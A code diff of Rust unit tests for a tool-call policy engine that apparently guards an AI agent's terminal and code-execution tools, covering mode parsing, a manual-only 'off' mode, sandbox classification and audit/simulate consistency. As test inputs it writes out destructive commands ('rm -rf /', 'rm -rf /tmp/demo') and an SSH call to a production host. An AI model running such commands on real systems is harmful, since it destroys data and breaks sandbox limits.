-            policy.evaluate("terminal", &serde_json::json!({"cmd":"rm -rf /tmp/demo"}));
-        assert!(
-            !rm_decision.allow,
-            "default relaxed preset should still block destructive rm commands"
+        std::env::set_var("HERMES_TOOL_POLICY_MODE", "not-a-mode");
+        let error = ToolPolicyEngine::try_from_env().expect_err("invalid mode must fail");
+        assert!(error.contains("HERMES_TOOL_POLICY_MODE"));
+        let decision = ToolPolicyEngine::from_env().evaluate("terminal", &serde_json::json!({}));
+        assert!(!decision.allow);
+        assert_eq!(
+            decision.code.as_deref(),
+            Some("invalid_policy_configuration")
         );
 
-        match mode_orig {
-            Some(v) => std::env::set_var("HERMES_TOOL_POLICY_MODE", v),
-            None => std::env::remove_var("HERMES_TOOL_POLICY_MODE"),
+        std::env::set_var("HERMES_TOOL_POLICY_MODE", "off");
+        let error = ToolPolicyEngine::try_from_env().expect_err("off must not be an env mode");
+        assert!(error.contains("manual-only"));
+    }
+
+    #[test]
+    fn off_policy_is_explicit_manual_construction_only() {
+        assert!(ToolPolicyMode::parse_production("off").is_err());
+        let decision = ToolPolicyEngine::new(ToolPolicyMode::Off)
+            .with_denylist(&["terminal"])
+            .evaluate("terminal", &serde_json::json!({"command":"rm -rf /"}));
+        assert!(decision.allow);
+        assert_eq!(decision.mode, ToolPolicyMode::Off);
+        assert!(!decision.would_block);
+    }
+
+    #[test]
+    fn command_payload_policy_covers_execute_code_and_every_alias() {
+        let policy = ToolPolicyEngine::new(ToolPolicyMode::Enforce);
+        for tool in COMMAND_TOOLS {
+            let decision =
+                policy.evaluate(tool, &serde_json::json!({"command":"ssh prod.example"}));
+            assert!(
+                !decision.allow,
+                "command alias {tool:?} must be classified for sandbox policy"
+            );
+            assert_eq!(
+                decision.code.as_deref(),
+                Some("sandbox_profile_violation"),
+                "command alias {tool:?} must use command payload classification"
+            );
         }
-        match preset_orig {
-            Some(v) => std::env::set_var("HERMES_TOOL_POLICY_PRESET", v),
-            None => std::env::remove_var("HERMES_TOOL_POLICY_PRESET"),
-        }
-        match patterns_orig {
-            Some(v) => std::env::set_var("HERMES_TOOL_POLICY_DENY_PARAM_PATTERNS", v),
-            None => std::env::remove_var("HERMES_TOOL_POLICY_DENY_PARAM_PATTERNS"),
+    }
+
+    #[test]
+    fn audit_and_simulate_evaluation_match_enforcement_core_decision() {
+        let matrix = [
+            ("terminal", serde_json::json!({"command":"echo safe"})),
+            (
+                "terminal",
+                serde_json::json!({"command":"ssh prod.example"}),
+            ),
+            ("write_file", serde_json::json!({"path":"a"})),
+            ("execute_code", serde_json::json!({"code":"echo secret"})),
+        ];
+        for (tool, params) in matrix {
+            let enforce = ToolPolicyEngine::new(ToolPolicyMode::Enforce)
+                .with_allowlist(&["terminal", "execute_code"])
+                .with_deny_param_patterns(&["secret"])
+                .evaluate(tool, &params);
+            for mode in [ToolPolicyMode::Audit, ToolPolicyMode::Simulate] {
+                let candidate = ToolPolicyEngine::new(mode)
+                    .with_allowlist(&["terminal", "execute_code"])
+                    .with_deny_param_patterns(&["secret"])
+                    .evaluate(tool, &params);
+                assert_eq!(
+                    (candidate.allow, candidate.code, candidate.reason),
+                    (enforce.allow, enforce.code.clone(), enforce.reason.clone()),
+                    "{mode:?} changed the policy core for {tool:?} with {params}"
+                );
+            }
         }
     }
 
